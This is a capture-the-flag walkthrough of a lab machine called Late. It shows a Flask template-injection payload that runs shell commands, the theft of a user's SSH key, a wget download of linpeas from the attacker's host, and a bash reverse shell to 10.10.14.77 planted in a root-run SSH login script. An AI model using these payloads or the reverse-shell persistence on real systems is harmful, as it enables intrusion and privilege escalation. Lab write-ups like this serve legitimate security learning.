# LATE
### User flag

Normal nmap and fuzzing nothing really appears

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
I started inspecting the page and found a virtual host images.late.htb so I added it to /etc/hosts to inspects it too. The trick here is that the back-end uses flask (as the web page shows) so I created an image with text in gimp that said {{5*5}} and the text file returned 25 so now we have RCE. I searched for flask RCE commands on the web and found [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).

So I created various payloads with
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('command').read() }}
```
 I found out with whoami I was the user named svc_acc. I looked around his home and got his ssh key into my machine obtaining the user flag.

### Root flag

Once in the machine I downloaded linpeas.sh from my machine with

```bash
[kali@kali ~]$ python3 -m http.server 7777
...
svc_acc@late:/tmp$ wget 10.10.14.77:7777/linepeas.sh
chmod a+x linpeas.sh > result
less -r result
```

while reading the results the $PATH appears in orange multiple times so I visited the /usr/local/sbin and saw the file ssh-alert.sh. As the code and the name of the file indicates it seems it gets executed by root every time someone logs by ssh so I concatenated a reverse shell bash shell and connected again gaining access to root.

```bash
bash -i >& /dev/tcp/10.10.14.77/7777 0>&1
```
